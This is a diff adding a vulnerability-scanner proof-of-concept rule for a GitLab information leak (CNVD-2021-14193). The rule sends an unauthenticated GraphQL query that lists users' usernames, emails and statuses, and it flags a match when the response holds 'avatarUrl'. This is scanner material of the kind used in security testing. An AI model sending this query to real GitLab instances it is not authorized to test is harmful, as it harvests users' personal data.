@@ -1,0 +1,15 @@
+name: poc-yaml-gitlab-cnvd-2021-14193-infoleak
+rules:
+  - method: POST
+    path: /api/graphql
+    headers:
+      Content-Type: application/json
+    body: >-
+      {"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }","variables":null,"operationName":null}
+    follow_redirects: false
+    expression: response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(bytes("avatarUrl"))
+detail:
+  author: 说书人(http://python.vin/)
+  links:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-14193
+    - https://gitlab.com/gitlab-org/gitlab/-/issues/244275
